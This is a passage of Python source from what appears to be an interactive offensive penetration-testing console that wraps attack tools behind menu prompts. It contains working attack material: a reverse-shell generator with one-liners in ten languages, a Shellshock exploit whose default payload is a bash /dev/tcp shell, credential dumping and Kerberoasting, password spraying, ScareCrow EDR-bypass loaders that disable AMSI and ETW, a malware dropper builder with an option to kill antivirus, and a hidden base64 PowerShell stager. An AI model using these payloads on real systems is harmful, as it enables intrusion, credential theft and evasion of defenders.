                    "--kerberoasting": ["kerb_file"],
                    "--asreproast": ["asrep_file"],
                    "--gmsa-convert-id": ["id"],
                    "--gmsa-decrypt-lsa": ["gmsa_account"],
                    "--bloodhound": ["-ns", "ip", "--collection", "All"],
                    "--maq": [],
                    "--adcs": []
                },
                "ftp": {
                    "--ls": ["folder_name"]
                },
                "vnc": {}
            }

            options = []

            if action:
                print_warn(f"Select the options for {action}:")
                for k, option in enumerate(options_dict[protocol][action], start=1):
                    print_msg(f"{k}. {option}")

                while True:
                    try:
                        option_choice = int(input("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
                        if option_choice == -1:
                            break
                        if option_choice < 0 or option_choice >= len(options_dict[protocol][action]):
                            print_error("Invalid choice. Please select a valid number.")
                            continue
                        option_value = input(f"    [!] Enter the value for {options_dict[protocol][action][option_choice]}: ").strip()
                        options.append(f"{options_dict[protocol][action][option_choice]} {option_value}")
                    except ValueError:
                        print_error("Invalid input. Please enter a valid number.")

            if not os.path.exists(f"{path}/sessions/credentials.txt"):
                print_error("Not file credentials.txt in sessions directory to create use some like this: createcredentials admin:admin")
                return

            path_cred = get_credentials(True)

            if not os.path.exists(path_cred):
                netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter} --log sessions/{rhost}_netexec.txt"
            else:
                with open(path_cred, "r") as file:
                    for file_line in file:
                        params = file_line.split(":")
                        username = params[0]
                        password = params[1].replace("\n", "")
                        netexec_command = f"netexec {protocol} -t {threads} --timeout {timeout} --jitter {jitter}  -u {username} -p '{password}' --log sessions/{rhost}_{protocol}_netexec.txt "

            if options:
                netexec_command += " " + " ".join(options)
            choice = input(f"   [!] Enter 1 to use ip enter 2 to use domain 3 use subdomain (default 1 {rhost}): ") or '1'
            if choice == "1":
                netexec_command += f" {rhost}"
            elif choice == "2":
                netexec_command += f" {domain}"
            elif choice == "3":
                netexec_command += f" {subdomain}.{domain}"
            else:
                netexec_command += f" {subdomain}"

            self.cmd(netexec_command)

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category(persistence_category)
    def do_scarecrow(self, line):
        """
        Executes ScareCrow with various options for bypassing EDR solutions and executing shellcode.
        to create the shellcode.bin you need run venom or run lazymsfvenom, or run msfvenom yourself :D
        :param line: Not used directly but reserved for future use.
        :returns: None
        """
        if not is_binary_present("ScareCrow"):
            print_warn("ScareCrow is not installed. Installing dependencies and building ScareCrow.")
            self.cmd("sudo apt-get install -y golang osslsigncode mingw-w64")
            self.cmd("go get github.com/fatih/color")
            self.cmd("go get github.com/yeka/zip")
            self.cmd("go get github.com/josephspurrier/goversioninfo")
            self.cmd("mkdir -p ~/bypass && cd ~/bypass && git clone https://github.com/optiv/ScareCrow && cd ScareCrow && go build ScareCrow.go")

            command = """
            bash -c '
            if [[ "$SHELL" == */bash ]]; then
                echo "    [!] Bash"
                echo "export PATH=$PATH:~/bypass/ScareCrow" >> ~/.bashrc
            elif [[ "$SHELL" == */zsh ]]; then
                echo "    [!] Zsh"
                echo "export PATH=$PATH:~/bypass/ScareCrow" >> ~/.zshrc
            fi
            '
            """.replace("            ", "")
            self.cmd(command)
        url = self.params["url"]
        domain = self.params["domain"]
        print_warn("Select the mode you want to use:")
        options = [
            "Evasion (Disk, KnownDLL, None)",
            "Exec (RtlCopy, ProcessInjection, NtQueueApcThreadEx, VirtualAlloc)",
            "Loader (binary, control, dll, excel, msiexec, wscript)",
            "Clone Cert",
            "Custom Config File",
            "Enable Console Mode",
            "Delivery (bits, hta, macro)",
            "Domain Cert",
            "Encryption Mode (AES, ELZMA, RC4)",
            "Export (DLL)",
            "Injection Path",
            "Disable AMSI",
            "Disable ETW",
            "Disable Signing",
            "Disable Sleep Delay",
            "Obfuscation",
            "Set Output Path",
            "Sandbox Evasion",
            "Set URL",
            "Set Valid Cert"
        ]

        for i, option in enumerate(options, start=1):
            print_msg(f"{i}. {option}")

        try:
            choice = int(input("    [!] Enter the number corresponding to the option: ")) - 1
            if choice < 0 or choice >= len(options):
                print_error("Invalid choice. Please select a valid number.")
                return
            print_msg("Enter the shellcode.bin: ")
            shellcode = get_users_dic("bin")
            if not shellcode:
                print_error("Enter a valid choice")
                return
            scarecrow_command = f"cd sessions && ~/bypass/ScareCrow/ScareCrow -I {shellcode}"

            if choice == 0:
                evasion = input("    [!] Enter Evasion type (Disk/KnownDLL/None) [default: Disk]: ").strip() or "Disk"
                scarecrow_command += f" -Evasion {evasion}"
                scarecrow_command += f" -domain {domain}"

            if choice == 1:
                exec_method = input("    [!] Enter Exec method (RtlCopy/ProcessInjection/NtQueueApcThreadEx/VirtualAlloc) [default: RtlCopy]: ").strip() or "RtlCopy"
                scarecrow_command += f" -Exec {exec_method}"
                scarecrow_command += f" -domain {domain}"
            if choice == 2:
                loader = input("    [!] Enter Loader type (binary/control/dll/excel/msiexec/wscript) [default: binary]: ").strip() or "binary"
                scarecrow_command += f" -Loader {loader}"

                if loader in ["binary", "dll"]:
                    shellcode_path = input("    [!] Enter the path to the raw 64-bit shellcode [default: /path/to/shellcode]: ").strip() or "sessions/shellcode.bin"
                    scarecrow_command += f" -I {shellcode_path}"

                if loader not in ["binary", "dll"]:
                    output_name = input("    [!] Enter the output file name (e.g., loader.js or loader.hta) [default: loader.js]: ").strip() or "loader.js"
                    scarecrow_command += f" -O sessions/{output_name}"

                if loader in ["control", "excel", "wscript"]:
                    delivery = input("    [!] Enter delivery method (bits/hta/macro) [default: bits]: ").strip() or "bits"
                    scarecrow_command += f" -delivery {delivery}"
                    if delivery == "hta" and loader in ["binary", "dll"]:
                        print_error("Binary and DLL loaders are not compatible with HTA delivery.")
                        return
                scarecrow_command += f" -domain {domain}"
            if choice == 7:
                delivery = input("    [!] Enter delivery method (bits/hta/macro): ").strip()
                scarecrow_command += f" -delivery {delivery}"

            if choice == 8:
                encryption = input("    [!] Enter encryption mode (AES/ELZMA/RC4): ").strip()
                scarecrow_command += f" -encryptionmode {encryption}"

            if choice == 19:
                url = input(f"    [!] Enter the url [default: {url}]: ").strip() or url
                scarecrow_command += f" -url {url}"



            print_msg(f"Running ScareCrow with command: {scarecrow_command}")
            self.cmd(f"{scarecrow_command} ")

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category(credential_access_category)
    def do_createmail(self, line):
        """
        Generate email permutations based on a full name and domain, then save them to a file.

        This function prompts the user for a full name and domain, generates various email
        permutations based on that information, and saves the results in a text file located
        in the `sessions` directory.

        Parameters:
        line (str): used as Fullname.

        Internal Variables:
        full_name (str): The full name entered by the user, defaulting to 'John Doe'.
        domain (str): The domain entered by the user, defaulting to 'example.com'.

        Returns:
        None

        Example Usage:
        - To generate emails using default values: `createmail`
        - To specify a full name and domain: `createmail`

        Note:
        - The generated emails will be stored in a file named `emails_{full_name}_{domain}.txt`
          within the `sessions` directory.
        """
        url = self.params["url"]
        domain_def = get_domain(url)
        if not line:
            full_name = input("Enter full name (default: John Doe): ") or "John Doe"
        else:
            full_name = line

        domain = input("Enter domain (default: example.com): ") or domain_def
        print_error(domain)
        emails = generate_emails(full_name, domain)
        file_name = f"emails_{full_name.replace(' ', '_')}_{domain}.txt"
        file_path = os.path.join("sessions", file_name)

        with open(file_path, 'w') as f:
            for email in emails:
                f.write(email + '\n')

        print_msg(f"Emails have been saved to {file_path}")
        self.cmd(f"cat {file_path}")
        return

    @cmd2.with_category(reporting_category)
    def do_eyewitness(self, line):
        """
        Executes EyeWitness to capture screenshots from a list of URLs.
        You need to provide a file containing URLs or a single URL to capture.
        :param line: Not used directly but reserved for future use.
        :returns: None
        """
        if not is_binary_present("eyewitness"):
            print_warn("EyeWitness is not installed. Installing dependencies.")
            self.cmd("sudo apt install eyewitness -y")

        print_warn("Select the input option for EyeWitness:")
        options = [
            "File containing URLs",
            "Single URL"
        ]

        for i, option in enumerate(options, start=1):
            print_msg(f"{i}. {option}")

        try:
            choice = int(input("    [!] Enter the number corresponding to the option: ")) - 1
            if choice < 0 or choice >= len(options):
                print_error("Invalid choice. Please select a valid number.")
                return

            eyewitness_command = "/usr/share/eyewitness/EyeWitness.py"

            if choice == 0:
                file_path = input("    [!] Enter the path to the file containing URLs: ").strip()
                eyewitness_command += f" -f {file_path}"

            elif choice == 1:
                url = self.params["url"]
                single_url = input("    [!] Enter the single URL: (default url in payload.json)").strip() or url
                eyewitness_command += f" --single {single_url}"

            if input("    [!] Do you want to specify a timeout (default: 7 seconds)? (y/n): ").strip().lower() == 'y':
                timeout = input("    [!] Enter timeout in seconds: ").strip()
                eyewitness_command += f" --timeout {timeout}"


            output_dir = input("    [!] Enter output directory name: (default: sessions/eye)").strip() or "sessions/eye"
            eyewitness_command += f" -d {output_dir}"
            eyewitness_command += f" --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'"
            eyewitness_command += " --show-selenium"
            #eyewitness_command += " --firefox-binary /usr/bin/firefox-esr"
            print_msg(f"Running EyeWitness with command: {eyewitness_command}")
            self.cmd(eyewitness_command)

        except ValueError:
            print_error("Invalid input. Please enter a valid number.")
        return

    @cmd2.with_category(exfiltration_category)
    def do_secretsdump(self, line):
        """Run secretsdump.py with the provided domain, username, password, and IP address.

        :param line: This parameter is not used in the function but can be reserved for future use.

        :returns: None

        Manual execution:
        To manually run `secretsdump.py`, use the following command:

            secretsdump.py <domain>/<username>:<password>@<ip_address>

        This function prompts the user for domain, username, password, and IP address.
        """
        if not is_binary_present("secretsdump.py"):
            print_warn("secretsdump.py is not installed. Installing dependencies.")
            self.cmd("sudo apt install impacket -y")

        print_msg("Gathering credentials for secretsdump.py execution...")
        url = self.params["url"]
        rhost = self.params["rhost"]
        wordlist = self.params["wordlist"]
        dominio = get_domain(url)

        path_cred = "sessions/credentials.txt"
        if line:
            if line.startswith("sam"):
                if os.path.exists("sessions/SYSTEM"):
                    hashs = "sessions/hashs.txt"
                    cleanned = "sessions/hashs_cleaned.txt"
                    command = f"secretsdump.py -system sessions/SYSTEM -sam sessions/SAM LOCAL -outputfile {hashs}"
                    print_msg(f"Executing command: {command}")
                    self.cmd(command)
                    self.cmd(f"nano {hashs}.sam")
                    self.cmd(f"cat {hashs}.sam")
                    command = f"sudo john --fork=4 --format=nt {hashs}.sam --wordlist={wordlist}"
                    print_msg(command)
                    self.cmd(command)
                    self.cmd(f"sudo john {hashs}.sam --show")
                    return
                else:
                    print_error("You need credentials.txt or SAM and SYSTEM files")

            elif line.startswith("creds"):
                with open(path_cred, "r") as file:
                    for file_line in file:
                        params = file_line.split(":")
                        username = params[0]
                        password = params[1].replace("\n", "")
                        domain = input(f"    [!] Domain: (default: {dominio})").strip() or dominio
                        ip_address = input(f"    [!] IP Address: (default: {rhost})").strip() or rhost
                        command = f"secretsdump.py {domain}/{username}:{password}@{ip_address}"
                        print_msg(f"Executing command: {command}")

                        self.cmd(command)
                        return
            elif line.startswith("system"):

                commands = "cd sessions && secretsdump.py local -system registry/SYSTEM -security registry/SECURITY -ntds Active\ Directory/ntds.dit -outputfile hashes"

                print_msg(commands)
                self.cmd(commands)

                command = "cd sessions && cut -d ':' -f 4 hashes.ntds > hashes.txt"

                print_msg(command)
                self.cmd(command)

                command = "cd sessions && awk -F ':' '{print $3 \":\" $4}' hashes.ntds > hashes2.txt"

                print_msg(command)
                self.cmd(command)
                return
        else:
            print_error("use options line like: secretsdump sam | creds | system")
        return

    @cmd2.with_category(exfiltration_category)
    def do_getuserspns(self, line):
        """Run GetUserSPNs.py with the provided domain, username, password, and IP address.

        :param line: This parameter is not used in the function but can be reserved for future use.

        :returns: None

        Manual execution:
        To manually run `GetUserSPNs.py`, use the following command:

            GetUserSPNs.py <domain>/<username>:<password> -dc-ip <IP of DC> -request

        This function prompts the user for domain, username, password, and IP address.
        """
        if not is_binary_present("GetUserSPNs.py"):
            print_warn("GetUserSPNs.py is not installed. Installing dependencies.")
            self.cmd("sudo apt install impacket -y")

        print_msg("Gathering credentials for GetUserSPNs.py execution...")
        url = self.params["url"]
        rhost = self.params["rhost"]
        dominio = get_domain(url)
        domain = input(f"    [!] Domain: (default: {dominio}) ").strip() or dominio

        path_cred = "sessions/credentials.txt"

        if not os.path.exists(path_cred):
            username = input("    [!] Username: ").strip()
            password = input("    [!] Password: ").strip()
        else:
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    if not line:
                        username = params[0]
                    else:
                        username = line
                    password = params[1].replace("\n", "")

        ip_address = input(f"    [!] IP Address: (default: {rhost}) ").strip() or rhost

        command = f"GetUserSPNs.py {domain}/{username}:{password} -dc-ip {ip_address} -request"
        print_msg(f"Executing command: {command}")

        self.cmd(command)

        return

    @cmd2.with_category(credential_access_category)
    def do_passwordspray(self, line):
        """Perform password spraying using crackmapexec with the provided parameters.

        :param line: This parameter is not used in the function but can be reserved for future use.

        :returns: None

        Manual execution:
        To manually run `crackmapexec` for password spraying, use the following command:

            crackmapexec smb <IP Address> -u <users_file> -p <password> --continue-on-success

        This function prompts the user for IP address, user file, and password.
        """
        if not is_binary_present("crackmapexec"):
            print_warn("crackmapexec is not installed. Installing dependencies.")
            self.cmd("sudo apt install crackmapexec -y")
        rhost = self.params["rhost"]
        print_msg("Gathering parameters for password spraying with crackmapexec...")

        ip_address = input("    [!] Enter the IP Address of your target: ").strip() or rhost
        users_file = input("    [!] Enter the location of your users.txt file: ").strip() or "sessions/users.txt"
        password = input("    [!] Enter the password you want to spray at the users: ").strip()

        command = f"crackmapexec smb {ip_address} -u {users_file} -p '{password}' --continue-on-success"
        print_msg(f"Executing command: {command}")

        self.cmd(command)

        return

    @cmd2.with_category(scanning_category)
    def do_vscan(self, line):
        """Perform port scanning using vscan with the provided parameters.

        :param line: This parameter is not used in the function but can be reserved for future use.

        :returns: None

        Manual execution:
        To manually run `vscan` for port scanning, use the following command:

            ./vscan -host <hosts> -p <ports>

        This function prompts the user for the target hosts and ports, and executes the vscan command accordingly.
        """
        if not is_binary_present("vscan"):
            print_warn("vscan is not installed. Installing dependencies and vscan tool.")
            self.cmd("sudo apt install -y libpcap-dev golang git")
            self.cmd("cd && git clone https://github.com/veo/vscan.git")
            self.cmd("cd vscan && go build")
            command = """
            bash -c '
            if [[ "$SHELL" == */bash ]]; then
                echo "    [!] Bash"
                echo "export PATH=$PATH:~/vscan" >> ~/.bashrc
            elif [[ "$SHELL" == */zsh ]]; then
                echo "    [!] Zsh"
                echo "export PATH=$PATH:~/vscan" >> ~/.zshrc
            fi
            '
            """.replace("            ", "")
            self.cmd(command)
        print_msg("Gathering parameters for vscan port scanning...")

        rhost = self.params["rhost"]
        hosts = input("    [!] Enter the hosts to scan (comma-separated): ").strip() or rhost
        if not hosts:
            print_error("    [!] Hosts cannot be empty!")
            return

        ports = input("    [!] Enter the ports to scan (comma-separated or range): ").strip() or "80,443,22,21,23,25,110,143,53,3306,8080,3389,135,139,445,993,995,1723,111,5900,1025,465,587,49152,49153,49154,49155,49156,49157,548,631,993,2049,444,5000,5060,5800,53,111,179,123,137,138,69,514,2049,520,162,4500"

        output_file = input("    [!] Enter the output file : ").strip() or hosts.replace(",","_")

        command = f"cd sessions && vscan -host {hosts} -p {ports} -v"

        if output_file:
            command += f" -json -o {output_file}.json"

        print_msg(f"Executing command: {command}")
        self.cmd(command)

        return

    @cmd2.with_category(exploitation_category)
    def do_shellshock(self, line):
        """
        Attempt to exploit the Shellshock vulnerability (CVE-2014-6271, CVE-2014-7169).

        This function generates HTTP requests with a crafted payload to detect if a target is vulnerable to Shellshock.

        :param line: Input parameters for the function.
        :returns: None
        """
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        url = self.params["url"]
        command = f"'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        # customheader = "X-Custom-Header: () { :; }; echo; {command}".replace("{command}", command)
        host = input(f"    [!] Enter the target host (default: {url}): ").strip() or url
        port = input("    [!] Enter the target port (default: 80): ").strip() or "80"
        uri = input("    [!] Enter the target URI (default: /): ").strip() or "/"
        custom_header = input("    [!] Enter the custom header (default: None): ").strip() or None
        cmd = input(f"    [!] Enter the command to execute (default: {command}): ").strip() or command
        host = clean_url(host)
        response, random_string = generate_http_req(host, port, uri, custom_header, cmd)

        if response.status_code == 200 and (random_string is None or random_string in response.text):
            print_msg(f"    [*] The target {host}:{port} appears to be vulnerable to Shellshock!")
            if cmd:
                print_msg(f"    [*] Command output:\n{response.text}")
        else:
            print_warn(f"    [-] The target {host}:{port} does not appear to be vulnerable to Shellshock.")
        return

    @cmd2.with_category(persistence_category)
    def do_generate_revshell(self, line):
        """
        Generate a reverse shell in various programming languages.

        This function prompts the user to choose a reverse shell type (Bash, Python, NetCat, PHP, Ruby, Perl, Telnet, NodeJS, Golang, PowerShell)
        and then asks for the necessary parameters (IP and port). Based on the user's input, it generates the corresponding
        reverse shell command.

        :param line: Not used in this implementation.
        :returns: None
        """
        shell_options = {
            "1": "Bash",
            "2": "Python",
            "3": "NetCat",
            "4": "PHP",
            "5": "Ruby",
            "6": "Perl",
            "7": "Telnet",
            "8": "NodeJS",
            "9": "Golang",
            "10": "PowerShell"
        }

        print_msg("Choose the type of reverse shell to generate:")
        for key, value in shell_options.items():
            print_msg(f"{key}. {value}")

        choice = input("    [!] Enter your choice (1-10): ").strip()
        if choice not in shell_options:
            print_error("Invalid choice. Please enter a number between 1 and 10.")
            return
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        ip = input(f"    [!] Enter IP (default: {lhost}): ").strip() or lhost
        port = input(f"    [!] Enter Port (default: {lport}): ").strip() or lport

        if choice == "1":
            command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        elif choice == "2":
            command = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        elif choice == "3":
            command = f"nc -e /bin/sh {ip} {port}"
        elif choice == "4":
            command = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        elif choice == "5":
            command = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        elif choice == "6":
            command = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        elif choice == "7":
            command = f"rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p"
        elif choice == "8":
            command = f"node -e 'var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect({port}, \"{ip}\", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});'"
        elif choice == "9":
            command = f'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
        elif choice == "10":
            command = f"Start-Process $PSHOME\\powershell.exe -ArgumentList {{-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}} -WindowStyle Hidden"
        else:
            print_error("Invalid selection.")
            return

        print_msg(f"Generated {shell_options[choice]} Reverse Shell:\n{command}")
        copy2clip(command)
        return

    @cmd2.with_category(recon_category)
    def do_alterx(self, line):
        """
        Executes the 'alterx' command for subdomain enumeration on the provided domain. If 'alterx'
        is not installed, the function automatically downloads, installs, and configures it. The result
        of the subdomain enumeration is saved in a session-specific text file.

        Steps performed by the function:

        1. **Check if 'alterx' is installed:**
        - Uses `is_binary_present("alterx")` to verify if the 'alterx' binary is available in the system.
        - If the binary is not found, the function prints a warning and proceeds to download and install 'alterx'.

        2. **Installation of 'alterx':**
        - Executes a system command to create a directory named 'alterx' in the user's home directory.
        - Downloads the 'alterx' version 0.0.4 (Linux 64-bit) from GitHub and extracts it into the 'alterx' directory.

        3. **Add 'alterx' to system PATH:**
        - Depending on the user's shell (`bash` or `zsh`), it appends the 'alterx' directory to the system PATH
            by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx'
            can be executed from any directory.

        4. **Obtain the domain:**
        - Retrieves the URL from the class parameter `self.params["url"]`.
        - Extracts the domain from the URL using `get_domain(url)`.
        - If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to
            the previously extracted domain.

        5. **Execute 'alterx' on the domain:**
        - Executes the 'alterx' tool on the specified domain via a system command.
        - The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename
            `subdomain_dic_<domain>.txt`.

        Parameters:
        - line (str): The domain on which to run 'alterx'. If empty, the function prompts the user for input.

        Returns:
        - None: The function performs its operations but does not return any value.

        Dependencies:
        - The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()`
        and `get_domain()` helper functions.
        """
        if not is_binary_present("alterx"):
            print_warn("alterx not found. Installing...")
            command = "cd && mkdir alterx && cd alterx && wget https://github.com/projectdiscovery/alterx/releases/download/v0.0.4/alterx_0.0.4_linux_amd64.zip && unzip alterx_0.0.4_linux_amd64.zip"
            self.cmd(command)
            command = """
            bash -c '
            if [[ "$SHELL" == */bash ]]; then
                echo "    [!] Bash"
                echo "export PATH=$PATH:~/alterx" >> ~/.bashrc
            elif [[ "$SHELL" == */zsh ]]; then
                echo "    [!] Zsh"
                echo "export PATH=$PATH:~/alterx" >> ~/.zshrc
            fi
            '
            """.replace("            ", "")
            os.system(command)

        url = self.params["url"]
        domain = get_domain(url)
        if not line:
            line = input(f"    [!] Enter the domain: (Default: {domain})") or domain

        command = f"echo {line} | alterx > sessions/subdomain_dic_{line}.txt"
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(scanning_category)
    def do_allin(self, line):
        """
        Execute the AlliN.py tool with various scan modes and parameters.

        This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan),
        and then asks for the necessary parameters (host, ports, project name, etc.).
        Based on the user's input, it generates the corresponding command and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("AlliN.py"):
            print_warn("AlliN.py not found. Installing...")
            command = "cd && mkdir AlliN && cd AlliN && wget https://github.com/P1-Team/AlliN/raw/main/AlliN.py"
            self.cmd(command)
            command = """
            bash -c '
            if [[ "$SHELL" == */bash ]]; then
                echo "    [!] Bash"
                echo "export PATH=$PATH:~/AlliN" >> ~/.bashrc
            elif [[ "$SHELL" == */zsh ]]; then
                echo "    [!] Zsh"
                echo "export PATH=$PATH:~/AlliN" >> ~/.zshrc
            fi
            '
            """.replace("            ", "")
            self.cmd(command)

        scan_options = {
            "1": "pscan",
            "2": "sfscan",
            "3": "bakscan",
            "4": "subscan",
            "5": "17scan",
            "6": "nbscan"
        }

        print_msg("Choose the type of scan to perform with AlliN.py:")
        for key, value in scan_options.items():
            print_msg(f"{key}. {value}")

        choice = input("    [!] Enter your choice (1-6): ").strip()
        if choice not in scan_options:
            print_error("Invalid choice. Please enter a number between 1 and 6.")
            return
        rhost = self.params["rhost"]
        host = input(f"    [!] Enter the host (e.g., 192.168.1.1/24 or domain.com Default: {rhost}): ").strip() or rhost
        if not host:
            print_error("Host is required.")
            return

        project = input("    [!] Enter the project name (default: scan_project): ").strip() or f"scan_project_{host}"
        timeout = input("    [!] Enter timeout in seconds (default: 3): ").strip() or "3"
        threads = input("    [!] Enter number of threads (default: 200): ").strip() or "200"
        ports = input("    [!] Enter ports (optional, e.g., 80,443 or leave empty): ").strip() or '80,443'
        proxy = input("    [!] Enter proxy (optional, e.g., socks5://127.0.0.1:1080 or leave empty): ").strip()
        path = os.getcwd()
        sessions = f"{path}/sessions/"
        if choice == "5":
            python = "python2"
        else:
            python = "python3"
        command = f"cd && cd AlliN && {python} AlliN.py --host {host} --timeout {timeout} -t {threads} --project {sessions}{project} -m {scan_options[choice]}"

        if ports:
            command += f" -p {ports}"
        if proxy:
            command += f" --proxy {proxy}"
        print_msg(f"Generated command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(persistence_category)
    def do_dr0p1t(self, line):
        """
        Execute the Dr0p1t tool to create a stealthy malware dropper.

        This function prompts the user to input the necessary parameters for
        generating a dropper, including the malware URL, persistence options,
        and additional configurations. Based on the user's input, it constructs
        the command and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        if not is_binary_present("Dr0p1t.py"):
            print_warn("Dr0p1t.py not found. Installing...")
            command = "cd && git clone https://github.com/D4Vinci/Dr0p1t-Framework.git && cd Dr0p1t-Framework && chmod +x install.sh && ./install.sh"
            self.cmd(command)
        lhost = self.params["lhost"]
        malware_url = input("    [!] Enter the malware URL (e.g., https://example.com/malware.exe): ").strip() or f"http://{lhost}/shell.elf"
        if not malware_url:
            print_error("Malware URL is required.")
            return

        persistence_options = {
            "1": "--runas",
            "2": "-s",
            "3": "-t",
            "4": "-a"
        }

        print_msg("Choose persistence options for the dropper:")
        for key, value in persistence_options.items():
            print_msg(f"{key}. {value}")

        choice = input("    [!] Enter your choice (1-4, or leave blank for none): ").strip()
        persistence_command = ""
        if choice in persistence_options:
            persistence_command = persistence_options[choice]

        kill_av = input("    [!] Kill antivirus before execution? (y/n, default: n): ").strip().lower() or 'n'
        if kill_av == 'y':
            kill_av_command = "-k"
        else:
            kill_av_command = ""

        run_script = input("    [!] Run a batch script before running the malware (optional): ").strip()
        if run_script:
            run_script_command = f"-b {run_script}"
        else:
            run_script_command = ""

        icon = input("    [!] Use an icon for the final file (optional, path to icon): ").strip()
        if icon:
            icon_command = f"-i {icon}"
        else:
            icon_command = ""

        command = f"cd && cd Dr0p1t-Framework && python3 Dr0p1t.py {malware_url} {persistence_command} {kill_av_command} {run_script_command} {icon_command}".strip()

        print_msg(f"Generated command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(exfiltration_category)
    def do_gitdumper(self, line):
        """
        Install and execute the git-dumper tool to download Git repository content.

        This function checks if git-dumper is installed, and if not, installs it using pip.
        Then, it prompts the user to input the necessary parameters to run git-dumper, constructs
        the command, and executes it.

        :param line: Not used in this implementation.
        :returns: None
        """
        url = self.params["url"]
        if not is_package_installed("git-dumper"):
            print_warn("git-dumper not found. Installing...")
            self.cmd("pip3 install git-dumper")

        if not line:
            repo_url = input(f"Enter the Git repository URL (e.g., default: {url}").strip() or url
        if not repo_url:
            print_error("Repository URL is required.")
            return
        path = os.getcwd()
        domain = get_domain(repo_url)
        output_dir = f"{path}/sessions/{domain}"
        if not output_dir:
            print_error("Output directory is required.")
            return
        command = f"git-dumper {repo_url} {output_dir}"
        print_msg(f"Executing command: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_powershell_cmd_stager(self, line):
        """
        Generate and execute a PowerShell command stager to run a .ps1 script.

        This function takes the name of a PowerShell script (.ps1), encodes its content in base64,
        and constructs a command to execute the script using PowerShell in a hidden and elevated manner.
        The function then prints the generated command.

        :param line: The name of the PowerShell script file to encode and execute.
        :returns: None
        """
        if not line:
            print_error("PowerShell script file name is required and exist in sessions directory!")
            return
        path = os.getcwd()
        sessions = f"{path}/sessions/"
        script_file = line.strip()
        fullpath_script_file = f"{sessions}{script_file}"
        try:
            with open(fullpath_script_file, 'r') as file:
                script_content = file.read()
        except FileNotFoundError:
            print_error(f"File not found: {fullpath_script_file}")
            return
        except IOError as e:
            print_error(f"Error reading file {fullpath_script_file}: {str(e)}")
            return

        script_encoded = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
        cmd_stager = f"""
        %comspec% /b /c start /b /min powershell -nop -ep bypass -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{script_encoded}')))"
        """
        print_msg(f"Generated command:\n")
        copy2clip(cmd_stager)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_shellcode_search(self, line):
        """
        Search the shell-storm API for shellcodes using the provided keywords.

        This function sends a GET request to the shell-storm API with the specified keywords.
        It then prints the results.

        :param line: A string containing the keywords to search for.
        :returns: None
        """
        if not line:
            line = input("Enter keywords for shellcode search (default: 'aix'): ") or 'aix'

        keywords = line.strip().replace(' ', '*')
        url = f"http://shell-storm.org/api/?s={keywords}"

        try:
            response = requests.get(url).text.splitlines()
            if response:
                print_msg(f"[*] {len(response)} results found")
                for shellcode in response:
                    sc = shellcode.split('::::')
                    print_msg(f"Title: {sc[2]}, Platform: {sc[1]}, ID: {sc[3]}, Author: {sc[0]}, URL: {sc[4]}")

                shellcode_id = input("[*] Select shellcode id: ")
                subprocess.call("clear", shell=True)
                shellcode_url = f"http://shell-storm.org/shellcode/files/shellcode-{shellcode_id}.html"
                shellcode_response = requests.get(shellcode_url).text
                shellcode_response = shellcode_response.replace("&quot;", '"')
                shellcode = extract(shellcode_response, False)
                shellcode = clean_html(shellcode)
                print_msg(shellcode)

